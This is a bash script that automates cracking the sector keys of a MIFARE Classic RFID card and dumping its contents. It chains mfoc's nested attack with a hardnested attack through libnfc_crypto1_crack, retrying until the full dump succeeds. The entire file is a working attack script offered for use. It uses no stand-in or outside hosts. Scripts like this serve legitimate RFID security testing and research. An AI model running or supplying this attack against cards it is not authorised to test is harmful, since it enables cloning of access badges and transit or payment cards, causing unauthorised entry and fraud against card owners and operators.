#!/bin/bash

myUID=$(nfc-list -t 1|sed -n 's/ //g;/UID/s/.*://p')
TMPFILE_MFD="mfc_${myUID}_dump.mfd"
TMPFILE_UNK="mfc_${myUID}_unknownMfocSectorInfo.txt"
TMPFILE_FND="mfc_${myUID}_foundKeys.txt"

if [ -f "$TMPFILE_FND" ]; then
    mfoc -f "$TMPFILE_FND" -O "$TMPFILE_MFD"  -D "$TMPFILE_UNK"
else
    mfoc -O "$TMPFILE_MFD" -D "$TMPFILE_UNK"
fi
mfocResult=$?
prngNotVulnerable=9
keepTrying=1
foundKeysForMFOC=" "

while [ $keepTrying -eq 1 ]; do
    #echo "MFOC result: $mfocResult"
    if [ "$mfocResult" == "$prngNotVulnerable" ]; then
        echo "MFOC not possible, detected hardened Mifare Classic"
        if [ "$mfocResult" -eq 9 ]; then
            count=0
            while read -r LINE; do
                let count++
                #echo "$count $LINE"
            done < "$TMPFILE_UNK"

            arr=($(echo "$LINE" | tr ';' ' '))
            #echo ${arr[0]}
            #echo ${arr[1]}
            #echo ${arr[2]}
            #echo ${arr[3]}
            #echo ${arr[4]}

            knownKey=${arr[0]}
            knownSectorNum=${arr[1]}
            knownKeyLetter=${arr[2]}
            unknownSectorNum=${arr[3]}
            unknownKeyLetter=${arr[4]}
            knownBlockNum=$((knownSectorNum * 4))
            unknownBlockNum=$((unknownSectorNum * 4))
            echo "Trying HardNested Attack..."
            mycmd=(libnfc_crypto1_crack "$knownKey" "$knownBlockNum" "$knownKeyLetter" "$unknownBlockNum" "$unknownKeyLetter" "$TMPFILE_FND")
            echo "${mycmd[@]}"
            "${mycmd[@]}"
        else
            echo "mfoc returned: $mfocResult"
            keepTrying=0
        fi

        cryptoCrackResult=$?
        if [ "$cryptoCrackResult" -eq 0 ];then
            while read -r LINE
            do
            echo "$LINE"
            done < "$TMPFILE_FND"

            #arr=(`echo $LINE | tr ';' ' '`)
            #echo ${arr[0]}
            #echo ${arr[1]}
            #echo ${arr[2]}
            #foundKeysForMFOC="$foundKeysForMFOC-k ${arr[0]} "
            mycmd=(mfoc -f "$TMPFILE_FND" -O "$TMPFILE_MFD"  -D "$TMPFILE_UNK")
            echo "${mycmd[@]}"
            "${mycmd[@]}"
            mfocResult=$?
        fi
    else
        keepTrying=0
    fi
done

rm -f "$TMPFILE_UNK" "$TMPFILE_FND" "0x${myUID}_"*".txt"
if [ $mfocResult -eq 0 ]; then
    echo -e "\n\nDump left in: $TMPFILE_MFD"
else
    rm -f "$TMPFILE_MFD"
fi
